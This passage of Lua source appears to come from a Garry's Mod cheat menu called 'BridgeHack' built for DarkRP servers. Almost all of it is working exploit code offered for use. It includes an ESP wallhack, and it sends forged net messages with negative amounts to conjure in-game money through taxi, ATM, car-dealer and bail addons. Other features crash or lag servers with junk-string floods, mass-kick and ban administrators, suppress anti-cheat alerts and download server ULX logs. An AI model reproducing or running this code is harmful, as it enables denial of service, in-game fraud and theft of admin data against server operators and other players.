        timer.Create("spamdashit"..BridgeHack.RandomVar,0.1,function()
 
                for k,v in pairs(ents.GetAll()) do
 
                        if v.Entity:GetString() == "spawned_shipment" then
 
                                status("Splitting shipment")
 
                                RunConsoleCommand("darkrp","splitshipment",v.Entity:EntIndex())
 
                        elseif v.Entity:GetClassName() == "spawned_weapon" then
 
                                status("Making shipment")
 
                                RunConsoleCommand("darkrp","makeshipment",v.Entity:EntIndex())
 
                        end end end) end
 
                       
 
if dspam == false then
 
        chatP("Spam split / make shipment OFF")
 
        timer.Simple(1,function()
 
                timer.Destroy("spamdashit"..BridgeHack.RandomVar,function()
 
                end) end) end
 
               
 
concommand.Add("bh_kun_ziptie_untie",function()
 
        chatP("Untieing...")
 
        for i=0,30 do
 
                net.Start("Kun_ZiptieStruggle")
 
                net.SendToServer()
 
        end
 
end)
 
 
 
concommand.Add("___darkrpshipments", function()
 
        if dspam != true then
 
                dspam = true
 
        elseif dspam == true then
 
                dspam = false
 
        end end)
 
 
 
local function BridgeHackCHECK(v)
 
        if v:Alive() == true && v:Health() ~= 0 && v:Health() >= 0 && v ~= LocalPlayer() && LocalPlayer():Alive() then
 
                return true
 
        else
 
                return false
 
        end end
 
 
 
hook.Add("HUDPaint", "JESP", function()
 
        for k,v in pairs(player.GetAll()) do
 
                if GetConVarNumber("bh_esp") > 0 then
 
                        if(v ~= LocalPlayer() and BridgeHackCHECK(v)) then
 
                                if GetConVarNumber("bh_renderdistance_enable") > 0 then
 
                                        if LocalPlayer():GetPos():Distance(v:GetPos()) < GetConVarNumber("bh_esp_rdistance") then
 
                                                local PlayerESP = (v:EyePos()):ToScreen()
 
                                                local infocolor = Color(GetConVarNumber("bh_esp_infocolor_r"),GetConVarNumber("bh_esp_infocolor_g"),GetConVarNumber("bh_esp_infocolor_b"))
 
                                                local infocolor = Color(GetConVarNumber("bh_esp_infocolor_r"),GetConVarNumber("bh_esp_infocolor_g"),GetConVarNumber("bh_esp_infocolor_b"))
 
                                               
 
                                                draw.DrawText(v:Name(), "BudgetLabel", PlayerESP.x, PlayerESP.y -46, team.GetColor(v:Team()), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
 
                                               
 
                                                if GetConVarNumber("bh_esp_rank") > 0 then
 
                                                        draw.DrawText(v:GetUserGroup(), "BudgetLabel", PlayerESP.x, PlayerESP.y -23, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
 
                                                end
 
                                               
 
                                                if GetConVarNumber("bh_esp_hp") > 0 then
 
                                                        local infocolor = Color(255,0,255)
 
                                                        draw.DrawText(v:Health() .. " HP", "BudgetLabel", PlayerESP.x, PlayerESP.y -34, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
 
                                                end
 
                                                       
 
                                                local col = team.GetColor(v:Team()) -- looped into esp (square box)    
 
                                                local min, max = v:WorldSpaceAABB()
 
                                               
 
                                                min, max = min:ToScreen(), max:ToScreen()
 
                                               
 
                                                local h = (min.y / 2) - (max.y / 2)
 
                                                surface.SetDrawColor(col.g, col.b, col.r)
 
                                               
 
                                                if GetConVarNumber("bh_esp_box") > 0 then
 
                                                        surface.DrawOutlinedRect(max.x +h/10, max.y + (min.y / 75), h, h)
 
                                                        surface.DrawOutlinedRect(max.x +h/10-.5, max.y + (min.y / 75)-.5, h+1, h+1)
 
                                                        surface.DrawOutlinedRect(max.x +h/10-1, max.y + (min.y / 75)-1, h+2, h+2)
 
                                                end end
 
                                else
 
                               
 
                                local PlayerESP = (v:EyePos()):ToScreen()
 
                                local infocolor = Color(0,255,0)
 
                                local infocolor = Color(GetConVarNumber("bh_esp_infocolor_r"),GetConVarNumber("bh_esp_infocolor_g"),GetConVarNumber("bh_esp_infocolor_b"))
 
                                draw.DrawText(v:Name(), "BudgetLabel", PlayerESP.x, PlayerESP.y -46, team.GetColor(v:Team()), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
 
                               
 
                                if GetConVarNumber("bh_esp_rank") > 0 then
 
                                        draw.DrawText(v:GetUserGroup(), "BudgetLabel", PlayerESP.x, PlayerESP.y -23, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
 
                                end
 
                               
 
                                if GetConVarNumber("bh_esp_hp") > 0 then
 
                                        local infocolor = Color(GetConVarNumber("bh_esp_infocolor_r"),GetConVarNumber("bh_esp_infocolor_g"),GetConVarNumber("bh_esp_infocolor_b"))
 
                                        draw.DrawText(v:Health() .. " HP", "BudgetLabel", PlayerESP.x, PlayerESP.y -34, infocolor, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT)
 
                                end
 
                               
 
                                local col = team.GetColor(v:Team()) -- looped into esp (square box)    
 
                               
 
                                local min, max = v:WorldSpaceAABB()
 
                                min, max = min:ToScreen(), max:ToScreen()
 
                                local h = (min.y / 2) - (max.y / 2)
 
                               
 
                                surface.SetDrawColor(col.g, col.b, col.r)
 
                               
 
                                if GetConVarNumber("bh_esp_box") > 0 then
 
                                        surface.DrawOutlinedRect(max.x +h/10, max.y + (min.y / 75), h, h)
 
                                        surface.DrawOutlinedRect(max.x +h/10-.5, max.y + (min.y / 75)-.5, h+1, h+1)
 
                                        surface.DrawOutlinedRect(max.x +h/10-1, max.y + (min.y / 75)-1, h+2, h+2)
 
                                end end end end end end)
 
 
 
function blur_on()
 
        DrawMaterialOverlay( "Models/effects/comball_tape", 0.5 )
 
end
 
 
 
function blur_off()
 
        DrawMaterialOverlay( "", 0.1 )
 
end
 
 
 
concommand.Add("+bh_menu", function( ply )
 
        status("Menu Opened.")
 
        if GetConVarNumber("bh_menu_effects") == 1 then
 
                hook.Add( "RenderScreenspaceEffects", "BlurBG", blur_on )
 
        end
 
--[[
 
        mainmenu
 
       
 
       
 
        THE MAIN
 
       
 
       
 
        MENU
 
       
 
       
 
       
 
        STARTS
 
       
 
       
 
       
 
        HERE
 
       
 
        |
 
        V
 
]]--
 
local menu = DermaMenu()
 
menu:Center()
 
menu:AddOption( "BridgeHack "..dlversion, function()
 
        AboutMenu()
 
end ):SetImage( "icon16/shield.png" )
 
menu:AddSpacer()
 
function menu:Paint( w, h )
 
        draw.RoundedBoxEx( 4, 0, 0, w, h, Color(255,255,255,150), true, true, true, true )
 
        draw.RoundedBoxEx( 4, 0, 0, w, 22, Color(255,137,0,200), true, true, false, false )
 
        surface.SetDrawColor( 0,0,0 )
 
        surface.DrawOutlinedRect( 0, 0, w, h)
 
end
 
local ForcingMenu, optMenu = menu:AddSubMenu("Client-side Forcing")
 
 
 
ForcingMenu:AddOption( "Force sv_allowcslua 1", function()
 
        ply:ConCommand("incrementvar sv_allowcslua 0 1 1")
 
        status("Forced SV_ALLOWCSLUA TO 1")
 
end):SetImage( "icon16/link_error.png" )
 
 
 
ForcingMenu:AddOption( "Force sv_cheats 1", function()
 
        ply:ConCommand("incrementvar sv_cheats 0 1 1")
 
        status("Forced SV_CHEATS TO 1")
 
end):SetImage( "icon16/link_error.png" )
 
 
 
local ESP = menu:AddSubMenu("ESP")
 
 
 
ESP:AddOption( "[ON] ESP", ESP_on):SetImage( "icon16/group_add.png" )
 
ESP:AddOption( "[OFF] ESP", ESP_off):SetImage( "icon16/group_delete.png" )
 
 
 
local Speed = menu:AddSubMenu("Speed")
 
Speed:AddOption( "[ON] SpeedHack", speedhack_on):SetImage( "icon16/lightning_go.png" )
 
Speed:AddOption( "[OFF] SpeedHack", speedhack_off):SetImage( "icon16/lightning_delete.png" )
 
 
 
 
 
local NameStealSub = menu:AddSubMenu( "Name Stealing/Changing" )
 
NameStealSub:AddOption( "[ON] Name Steal", function()
 
        ply:ConCommand("bh_namesteal_on")
 
end ):SetImage( "icon16/book_addresses.png" )
 
 
 
NameStealSub:AddOption( "[OFF] Name Steal", function()
 
        status("Stopped Script: Random Name Change [name steal]")
 
        ply:ConCommand("bh_namesteal_off")end ):SetImage( "icon16/book.png" )
 
       
 
local MoneyExploits = menu:AddSubMenu( "DarkRP Money Explots" )
 
       
 
        MoneyExploits:AddOption("[$$] Drug Sell",function()
 
                for i=1,1000 do
 
                        net.Start("Kun_SellDrug")
 
                        net.WriteString("Meth")
 
                        net.SendToServer()
 
                end end):SetImage( "icon16/coins_add.png" )
 
       
 
        MoneyExploits:AddOption( "[$$] Taxi Driver Money",function()
 
                chatp("Giving money")
 
                net.Start("Taxi_Add")
 
                        net.WriteString("MLG")
 
                        net.WriteTable({-1333.647461, -1473.931763, -139.968750})
 
                        net.WriteFloat(-99999999)
 
                        net.WriteString(Desc)
 
                net.SendToServer()
 
        end):SetImage( "icon16/coins_add.png" )
 
       
 
        MoneyExploits:AddOption( "[$$] SS Shelf NET",function()
 
                chatP("Attempting to give money..")
 
                for k,v in pairs(ents.GetAll()) do
 
                        swag = v
 
                end
 
                net.Start( 'NET_SS_DoBuyTakeoff' )          
 
                        net.WriteEntity(LocalPlayer())          
 
                        net.WriteEntity(swag)          
 
                        net.WriteTable({'spawned_weapon'})          
 
                        net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)      
 
                        net.SendToServer()  
 
        end):SetImage( "icon16/coins_add.png" )
 
       
 
        MoneyExploits:AddOption( "[$$] HITMAN MONEY",function()
 
                chatP("Attempting to give money..")
 
                net.Start( "DaHit" )
 
                        net.WriteFloat( -1000000000000000000000 )
 
                        --net.WriteFloat( tm )
 
                        net.WriteEntity( LocalPlayer() )
 
                        net.WriteEntity( LocalPlayer() )
 
                        net.WriteEntity( LocalPlayer() )
 
                net.SendToServer()
 
        end):SetImage( "icon16/coins_add.png" )
 
               
 
        MoneyExploits:AddOption( "[$$] HHH MONEY",function()
 
                local ply = LocalPlayer()
 
                for k,v in pairs(player.GetAll()) do  
 
                        dahater = v
 
                end
 
               
 
                local hitRequest = {}
 
                hitRequest.hitman = ply
 
                hitRequest.requester = ply
 
                hitRequest.target = dahater
 
                hitRequest.reward = 100000000
 
               
 
                net.Start( 'hhh_request' )
 
                        net.WriteTable( hitRequest )
 
                net.SendToServer()
 
               
 
        end):SetImage( "icon16/coins_add.png" )
 
       
 
        MoneyExploits:AddOption("[$$] BOONPC",function()
 
                net.Start('BuyCar')
 
                net.WriteFloat(-1000000000000)
 
                net.WriteEntity(LocalPlayer())
 
                net.WriteString("BridgeHack")
 
                net.WriteString("BridgeHack")
 
                net.WriteString("BridgeHack")
 
                net.SendToServer()
 
        end):SetImage( "icon16/coins_add.png" )
 
       
 
        MoneyExploits:AddOption("[$$] Hitman X Menu",function()
 
        local frame = vgui.Create( "DFrame" )
 
                frame:Center()
 
                frame:SetSize( 200,150 )
 
                frame:SetTitle( "" )
 
                frame:MakePopup()
 
                frame:ShowCloseButton( false )
 
        function frame:Paint( w, h )
 
                draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 255, 255, 150) )
 
                draw.RoundedBoxEx( 4, 0, 0, w, 20, Color( 240, 85, 0, 220), true, true, false, false )
 
                draw.SimpleText( "BridgeHack Hitman X Menu", "Default", 6, 2, Color( 255,255,255 ), 0, 0 )
 
        end
 
 
 
        local playerMenu = vgui.Create( "DComboBox", frame )
 
                playerMenu:SetPos( 10,40 )
 
                playerMenu:SetSize( 120,20 )
 
                playerMenu:SetText( "Select a Player")
 
        for k, v in pairs( player.GetAll() ) do
 
                playerMenu:AddChoice( tostring( v:Name() ) )
 
                playerMenu:SetTextColor(color_black)
 
        end
 
 
 
        local Button = vgui.Create("DButton", frame)
 
                Button:SetPos( 180, 2 )
 
                Button:SetSize( 20, 20 )
 
                Button:SetText( "" )
 
                function Button:Paint( w, h )
 
                        draw.SimpleText( "X", "Default", 6, 2, Color( 255,255,255 ), 0, 0 )
 
                end
 
                Button.DoClick = function()
 
                        frame:Close()
 
                end
 
 
 
        local SpamHit = vgui.Create("DButton", frame )
 
                SpamHit:SetPos( 20,70 )
 
                SpamHit:SetSize( 150,20 )
 
                SpamHit:SetText( "Get Money" )
 
                SpamHit:SetTextColor( Color(0,0,0) )
 
                SpamHit.DoClick = function()
 
                        local v = playerMenu:GetText()
 
                        net.Start( "SendMoney" )
 
                                net.WriteEntity( v )
 
                                net.WriteEntity( v )
 
                                net.WriteEntity( v )
 
                                net.WriteString( "-100000000000000000000000000000000000000000" )
 
                        net.SendToServer()
 
                end
 
 
 
        local CrashButton = vgui.Create("DButton", frame )
 
                CrashButton:SetPos( 20,90 )
 
                CrashButton:SetSize( 150,20 )
 
                CrashButton:SetText( "Crash Server" )
 
                CrashButton:SetTextColor( Color(0,0,0) )
 
                CrashButton.DoClick = function()                               
 
                        for i=0, 10 do
 
                        ply:ConCommand("bh_hitmanxcrash")
 
                        end
 
                end
 
 
 
        local InfaButton = vgui.Create("DButton", frame )
 
                InfaButton:SetPos( 20,110 )
 
                InfaButton:SetSize( 150,20 )
 
                InfaButton:SetText( "Infinite Money For Everyone" )
 
                InfaButton:SetTextColor( Color(0,0,0) )
 
                InfaButton.DoClick = function()
 
                        ply:ConCommand("bh_hitmanxinfa")
 
                end
 
        end):SetImage( "icon16/application_form.png" )
 
       
 
        MoneyExploits:AddOption( "[$$] HITMENU",function()
 
                local HitPanel = vgui.Create( "DFrame" )
 
                        HitPanel:SetPos( ScrW()/5, ScrH()/10 )
 
                        HitPanel:SetSize( 300, 200 )
 
                        HitPanel:SetTitle( " " )
 
                        HitPanel:SetVisible( true )
 
                        HitPanel:SetDraggable( true )
 
                        HitPanel:ShowCloseButton( false )
 
                        HitPanel:MakePopup()
 
                        function HitPanel:Paint( w, h )
 
                                draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 255,160) )
 
                                draw.RoundedBoxEx( 4, 0, 0, w, 25, Color( 240, 85, 0, 220), true, true, false, false )
 
                                draw.SimpleText( "BridgeHack HitHack Menu", "PopupFont", 6, 2, Color( 255,255,255 ), 0, 0 )
 
                        end
 
 
 
                local Button = vgui.Create("DButton", HitPanel)
 
                        Button:SetPos( 250, 0 )
 
                        Button:SetSize( 50, 25 )
 
                        Button:SetText( "" )
 
                        function Button:Paint( w, h )
 
                                draw.RoundedBoxEx( 4, 0, 0, w, h, Color(0,0,0,150) )
 
                                draw.SimpleText( "Close", "HeaderFont", 6, 2, Color( 255,255,255 ), 0, 0 )
 
                        end
 
                        Button.DoClick = function()
 
                                HitPanel:Close()
 
                        end    
 
 
 
                local HitButton = vgui.Create("DButton", HitPanel)
 
                        HitButton:SetPos( 140, 100 )
 
                        HitButton:SetSize( 100, 20 )
 
                        HitButton:SetText( "Get Money" )
 
                        HitButton:SetTextColor( Color(255,255,255) )
 
                        function HitButton:Paint( w, h )
 
                                draw.RoundedBoxEx( 4, 0, 0, w, h, Color(0,0,0,150) )
 
                        end
 
                        HitButton.DoClick = function()
 
                                ply:ConCommand("bh_hithack")
 
                        end            
 
 
 
                local HitSlider = vgui.Create( "DNumSlider", HitPanel )
 
                        HitSlider:SetPos( 20, 50 )
 
                        HitSlider:SetSize( 300, 40 )
 
                        HitSlider:SetText( "Money Ammount" )
 
                        HitSlider:SetMin( 0 )
 
                        HitSlider:SetMax( 1000000000 )
 
                        HitSlider:SetDecimals( 0 )
 
                        HitSlider:SetConVar( "bh_hitmenuammount" )
 
 
 
        end):SetImage( "icon16/coins_add.png" )  
 
       
 
        MoneyExploits:AddOption( "[$$] 3D Car Dealer",function()
 
                ply:ConCommand("bh_3dcardealer_spamstore")
 
        end):SetImage( "icon16/coins_add.png" )
 
       
 
        MoneyExploits:AddOption( "[$$] VCMOD Sell-car",function()
 
                chatP("Attempting to give money..")  
 
                for i=0,30 do  
 
                        for i=1,10 do
 
                                net.Start( "AttemptSellCar" )    
 
                                net.WriteInt(  i, 8 )
 
                                net.SendToServer()
 
                        end
 
                end
 
        end):SetImage( "icon16/coins_add.png" )  
 
 
 
        MoneyExploits:AddOption( "[$$] BAILNPC",function()
 
                chatP("Attempting to give money..")
 
                        net.Start( "BailOut" )
 
                        net.WriteEntity( ply )
 
                        net.WriteEntity( ply )
 
                        net.WriteFloat( -10000000000000)
 
                        net.SendToServer()
 
        end):SetImage( "icon16/coins_add.png" )
 
       
 
        MoneyExploits:AddOption("[$$] REALISTIC ATM",function()
 
                local DermaPanel = vgui.Create( "DFrame" )
 
                DermaPanel:SetPos( 100, 100 )
 
                DermaPanel:SetSize( 300, 200 )
 
                DermaPanel:SetTitle( " " )
 
                DermaPanel:SetVisible( true )
 
                DermaPanel:SetDraggable( true )
 
                DermaPanel:ShowCloseButton( true )
 
                function DermaPanel:Paint( w, h )
 
                                draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0,160) )
 
                                draw.RoundedBoxEx( 4, 0, 0, w, 25, Color( 240, 85, 0, 220), true, true, false, false )
 
                                draw.SimpleText( "BridgeHack Realistic ATM Hack Menu", "PopupFont", 6, 2, Color( 255,255,255 ), 0, 0 )
 
                end
 
                DermaPanel:MakePopup()
 
               
 
                local TextEntry = vgui.Create( "DTextEntry", DermaPanel )
 
                TextEntry:SetPos( 75, 30 )
 
                TextEntry:SetSize( 150, 25 )
 
                TextEntry:SetText( "Account num(Including the -!)" )
 
               
 
                local BBDButton = vgui.Create( "DButton",DermaPanel )
 
                BBDButton:SetPos( 10, 120 )
 
                BBDButton:SetText( "Give Money" )
 
                BBDButton:SetTextColor( Color(255,255,255) )
 
                BBDButton:SetSize( 280, 75 )
 
                function BBDButton:Paint( w, h )
 
                        draw.RoundedBoxEx( 4, 0, 0, w, h, Color(0,0,255,150) )
 
                end
 
                BBDButton.DoClick = function()
 
                        local accnumber = TextEntry:GetValue()
 
                        local moneytogive = GetConVarNumber("bh_ratm_money2give")
 
                        chatP("Attempting to give "..moneytogive.."$ on Account Number: "..accnumber)
 
                        net.Start("ATM_DepositMoney_C2S")
 
                                net.WriteTable({Memo =BridgeHack.RandomVar,Num=accnumber,Amount=-moneytogive})
 
                        net.SendToServer()
 
                end
 
               
 
                local RenderDistance = vgui.Create( "DNumSlider", DermaPanel )
 
                RenderDistance:SetPos( 10, 50)
 
                RenderDistance:SetSize( 275, 25 )
 
                RenderDistance:SetText( "Money to give" )
 
                RenderDistance:SetMin( 0 )
 
                RenderDistance:SetMax( 500000 )
 
                RenderDistance:SetDecimals( 0 )
 
                RenderDistance:SetConVar( "bh_ratm_money2give" )
 
        end):SetImage("icon16/coins_add.png")
 
       
 
        MoneyExploits:AddOption( "[$$] TOW TRUCK DRIVER",function()
 
                chatP("Giving money..")
 
                for k,v in pairs(ents.GetAll()) do
 
                        status("Attempting to make fine")
 
                        net.Start("TOW_SubmitWarning")
 
                                net.WriteString(LocalPlayer():SteamID())
 
                                net.WriteDouble(-100000000000)
 
                                net.WriteEntity(v)
 
                                net.SendToServer()
 
                               
 
                                net.Start("TOW_PayTheFine")
 
                                        net.WriteEntity(v)
 
                                net.SendToServer()
 
                end
 
        end):SetImage( "icon16/coins_add.png" )
 
       
 
local DARKRPBASEDSUB = menu:AddSubMenu( "DarkRP Minging/Scripts" )
 
 
 
        DARKRPBASEDSUB:AddOption("[ON] Dlog Lag",function()
 
                ply:ConCommand("bh_dlogs_lag")
 
        end):SetImage( "icon16/table_error.png" )
 
 
 
        DARKRPBASEDSUB:AddOption("[OFF] Dlog Lag",function()
 
                ply:ConCommand("bh_dlogs_lag_off")
 
        end):SetImage( "icon16/table_add.png" )
 
 
 
        DARKRPBASEDSUB:AddOption("HitMenu Spam",function()
 
                local ply = LocalPlayer()
 
 
 
                local frame = vgui.Create( "DFrame" )
 
                        frame:Center()
 
                        frame:SetSize( 200,150 )
 
                        frame:SetTitle( "" )
 
                        frame:MakePopup()
 
                        frame:ShowCloseButton( false )
 
                function frame:Paint( w, h )
 
                        draw.RoundedBox( 4, 0, 0, w, h, Color( 255, 255, 255, 150) )
 
                        draw.RoundedBoxEx( 4, 0, 0, w, 20, Color( 240, 85, 0, 220), true, true, false, false )
 
                        draw.SimpleText( "BridgeHack Hitspam", "Default", 6, 2, Color( 255,255,255 ), 0, 0 )
 
                end
 
 
 
                local playerMenu = vgui.Create( "DComboBox", frame )
 
                        playerMenu:SetPos( 10,40 )
 
                                playerMenu:SetSize( 120,20 )
 
                        playerMenu:SetText( "Select a Player")
 
                for k, v in pairs( player.GetAll() ) do
 
                        playerMenu:AddChoice( tostring( v:Name() ) )
 
                end
 
 
 
                local SpamHit = vgui.Create("DButton", frame )
 
                        SpamHit:SetPos( 50,70 )
 
                        SpamHit:SetSize( 100,20 )
 
                        SpamHit:SetText( "Place Dem Hits" )
 
                        SpamHit:SetTextColor( Color(0,0,0) )
 
                        SpamHit.DoClick = function()
 
                local v = playerMenu:GetText()
 
                        for i=0, 4 do
 
                        ply:ConCommand('addhit "'..v..'" 500')
 
                        end
 
                end
 
               
 
                local CrashButton = vgui.Create("DButton", frame )
 
                        CrashButton:SetPos( 50,110 )
 
                        CrashButton:SetSize( 100,20 )
 
                        CrashButton:SetText( "Crash Server" )
 
                        CrashButton:SetTextColor( Color(0,0,0) )
 
                        CrashButton.DoClick = function()
 
                                chatP("Hitmanmenu got rekt!")
 
                                consoleP("Hitmanmenu got rekt")                        
 
                                for i=0, 10 do
 
                                ply:ConCommand("bh_hitmancrash")
 
                                end
 
                end                    
 
 
 
                local Button = vgui.Create("DButton", frame)
 
                Button:SetPos( 170, 0 )
 
                Button:SetSize( 30, 20 )
 
                Button:SetText( "Close" )
 
                Button:SetTextColor( Color( 255, 255, 255) )
 
                function Button:Paint( w, h )
 
                draw.RoundedBox( 4, 0, 0, w, h, Color(0,0,0,200) )
 
                end
 
                Button.DoClick = function()
 
                frame:Close()
 
                end
 
 
 
                local label = vgui.Create( "DLabel", frame )
 
                label:SetPos( 10,20 )
 
                label:SetSize( 120,20 )
 
                label:SetTextColor( Color(0,0,0) )
 
                label:SetText( "Select Player:" )
 
        end):SetImage("icon16/accept.png")
 
       
 
        DARKRPBASEDSUB:AddOption("TP Spawn",function()
 
                ply:ConCommand("bh_tp_spawn")
 
        end):SetImage( "icon16/cake.png" )
 
       
 
        DARKRPBASEDSUB:AddOption("[ON] Advert Spam",function()
 
                ply:ConCommand("bh_advert 1")
 
        end):SetImage( "icon16/bell_add.png" )
 
       
 
        DARKRPBASEDSUB:AddOption("[OFF] Advert Spam",function()
 
                ply:ConCommand("bh_advert 0")
 
        end):SetImage( "icon16/bell_delete.png" )
 
       
 
        DARKRPBASEDSUB:AddOption("Remove looking at prop",function()
 
                timer.Simple(0.1,function()
 
                        chatP("(This can be binded to: bh_removelookingat)")
 
                        ply:ConCommand("bh_removelookingat")
 
                end)
 
        end):SetImage("icon16/map_delete.png")
 
       
 
        DARKRPBASEDSUB:AddOption( "[X] KUN ZIPTIES UNTIE SELF ",function()
 
                ply:ConCommand("bh_kun_ziptie_untie")
 
        end):SetImage( "icon16/cut.png" )    
 
       
 
        DARKRPBASEDSUB:AddOption( "Open Armory", function()    
 
                chatP("Opening armory..")    
 
                ARMORY_WeaponMenu()    
 
        end):SetImage( "icon16/bomb.png" )
 
       
 
        DARKRPBASEDSUB:AddOption( "[ON/OFF] Spam Split Shipment / Make Shipemnt", function()
 
                ply:ConCommand("___darkrpshipments")
 
        end):SetImage( "icon16/cut_red.png" )
 
       
 
        DARKRPBASEDSUB:AddOption( "[ON] Make everyone wanted (Cop only)", function()
 
                timer.Create("lollol3294385", 0.2, 0, function(  )
 
                        for k,v in pairs(player.GetAll()) do
 
                                local ligger_type = math.random(1,13)
 
                                local ligger_type1 = math.random(1,13)
 
                                status("Attempting Want on: " .. v:Nick() .. " - " .. v:SteamID())
 
                                if ligger_type1 == ligger_type then
 
                                        if last_ply == v:Nick() then
 
                                                local ligger_type = math.random(1,13)
 
                                                local ligger_type1 = math.random(1,13)
 
                                        else
 
                                                ply:ConCommand("darkrp wanted " .. v:Nick() .. " " .. math.random(1,999))
 
                                        end
 
                                       
 
                                        local last_ply = v:Nick()
 
                                        local ligger_type = math.random(1,13)
 
                                        local ligger_type1 = math.random(1,13)
 
                                        status("Force Wanting: " .. v:Nick())
 
                                end
 
                        end
 
                end)
 
        end):SetImage( "icon16/cross.png" )
 
       
 
        DARKRPBASEDSUB:AddOption( "[OFF] Make everyone wanted (Cop only)", function()
 
                timer.Destroy("lollol3294385")
 
                status("Stopped Want All Police")
 
        end):SetImage( "icon16/tick.png" )
 
       
 
        DARKRPBASEDSUB:AddOption( "[ON] DARKRP LAG", function()
 
                ply:ConCommand("__bh_lagdarkrpdashit")
 
        end):SetImage( "icon16/accept.png" )
 
       
 
        DARKRPBASEDSUB:AddOption( "[OFF] DARKRP LAG", function()
 
                ply:ConCommand("__bh_stopplag")
 
        end):SetImage( "icon16/cancel.png" )
 
       
 
        local SpoofingMenu = menu:AddSubMenu("Spoofing Scripts")
 
        SpoofingMenu:AddOption( "Spoof Player colours and physgun colours", function()
 
                ply:ConCommand("cl_weaponcolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
 
                ply:ConCommand("cl_playercolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
 
                status("Spoofed Physgun And Player Color.")
 
        end):SetImage( "icon16/color_wheel.png" )
 
       
 
        local exploitshacks = menu:AddSubMenu("Exploits")
 
       
 
        exploitshacks:AddOption( "Bypass APAnti (Anti propkill)",function()
 
                chatP("Bypassing Apanti..")
 
                net.Receive("sMsgStandard", function()
 
                        print("#Bypassed by HaxRUs")
 
                end)
 
       
 
                net.Receive("sNotifyHit", function()
 
               
 
                end)
 
               
 
                net.Receive("sMsgAdmins", function()
 
               
 
                end)
 
               
 
                net.Receive("sAlertNotice", function()
 
               
 
                end)
 
        end):SetImage( "icon16/link_break.png" )
 
       
 
        exploitshacks:AddOption("[NLR] [ON] Freeze Spawning",function()
 
                ply:ConCommand("bh_nlr_freeze 1")
 
        end):SetImage( "icon16/book_error.png" )
 
       
 
        exploitshacks:AddOption("[NLR] [OFF] Freeze Spawning",function()
 
                ply:ConCommand("bh_nlr_freeze 0")
 
        end):SetImage( "icon16/book.png" )
 
       
 
        exploitshacks:AddOption( "Steal ULX Logs ( will save to download/data/ulx_logs/" .. os.date("%m-%d-%y") .. ".txt )", function()
 
                status("Downloading ULX LOGS")
 
                if file.Exists("download/data/ulx_logs/" .. os.date("%m-%d-%y") .. ".txt", "GAME") == "false" then
 
                        consoleP("FILE EXISTS. REMOVE THE FILE BEFORE CONTINUEING!")
 
                else
 
                        RequestFile(os.date( "data/" .. "ulx_logs" .. "/" .. "%m-%d-%y" .. ".txt" ))
 
                        chatP("Downloading ulx logs. OPENING " .. os.date("%m-%d-%y") .. " IN 15 SECONDS....")
 
                        timer.Simple( 15, function()
 
                                chatP("Opened data/ulx_logs/" .. os.date("%m-%d-%y") .. ".txt")
 
                                consoleP("**********************")
 
                                consoleP("** SUCCESS ULX DUMP **")
 
                                consoleP("**********************")
 
                        end)
 
                end
 
        end ):SetImage( "icon16/lock_break.png" )
 
       
 
        exploitshacks:AddOption("[AE] KICK ADMINS+",function()
 
                chatP("Kicking... (Will only work on admins+)")
 
                timer.Create( "aekickdaskids", 3, 0, function()
 
                        for k,v in pairs(player.GetAll()) do
 
                                if( v:GetUserGroup() != "user" ) then
 
                                        if( v:GetUserGroup() != "vip" ) then
 
                                                for i=0, 700 do  
 
                                                        net.Start('plyWarning')          
 
                                                                net.WriteEntity(v)          
 
                                                                net.WriteString('You have to select a player before doing a action.')      
 
                                                        net.SendToServer()
 
                                                end
 
                                                consoleP('Attempting to kick '.. v:Nick().. "!")
 
                                        end
 
                                end
 
                        end
 
                end)
 
        end):SetImage("icon16/wand.png")
 
       
 
        exploitshacks:AddOption("ULX EXTENDED BAN ADMINS",function()
 
                chatP("Banning...")
 
                timer.Create(BridgeHack.RandomVar.."ulxextendedban",1,0,function()
 
                        for k,v in pairs(player.GetAll()) do
 
                                if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro
 
                                        if v != LocalPlayer() then
 
                                                status("Banning.. "..v:Nick())
 
                                                net.Start("banleaver")
 
                                                        net.WriteString(v:SteamID().."{sep}".."HaxRUs Rekt You")
 
                                                net.SendToServer()
 
                                        end
 
                                end
 
                        end
 
                end)
 
        end):SetImage("icon16/wand.png")
 
       
 
        exploitshacks:AddOption( " [ON] ATLAS CHAT: FREEZE EVERYBODY",function()
 
                chatP("Freezing everybody.. (Except you)")
 
                timer.Create("Imakelovetou"..BridgeHack.RandomVar,"3",0, function()
 
                        local trash = "";
 
                        for i=0, 15000 do
 
                                trash = trash .. string.char(math.random(32, 126));
 
                        end
 
                       
 
                        status("Freeze wave incoming")
 
                        timer.Simple(1,function()
 
                                status("Freeze wave done")
 
                        end)
 
                       
 
                        for i=0,3 do  
 
                                net.Start("atlaschat.chat")
 
                                        net.WriteString("// ".. trash)
 
                                net.SendToServer()
 
                        end
 
                end)
 
        end):SetImage( "icon16/lock.png" )
 
       
 
        exploitshacks:AddOption( " [OFF] ATLAS CHAT: FREEZE EVERYBODY",function()
 
                chatP("Stopping the freeze..")
 
                timer.Destroy("Imakelovetou"..BridgeHack.RandomVar,"3",0, function()
 
               
 
                end)  
 
        end):SetImage( "icon16/lock_open.png" )
 
       
 
        exploitshacks:AddOption( "[ON] ESSENTIALS ULX SPAM FRIENDS TABLE", function()
 
                timer.Create("spamdafukFRIENDSULX", 2, 0, function()
 
                        local friends = {}
 
                        table.insert( friends, math.random(1,9999) )
 
                        for i = 1,6000 do
 
                                net.Start("friendlist")
 
                                net.WriteTable(friends)
 
                                net.SendToServer()
 
                        end
 
                        status("PROGRESS [10000/10000]")
 
                end)
 
        end ):SetImage( "icon16/script_error.png" )
 
       
 
        exploitshacks:AddOption( "[OFF] ESSENTIALS ULX SPAM FRIENDS TABLE", function()
 
                timer.Destroy("spamdafukFRIENDSULX")
 
                status("Stopped ULX SPAM FRIENDS")
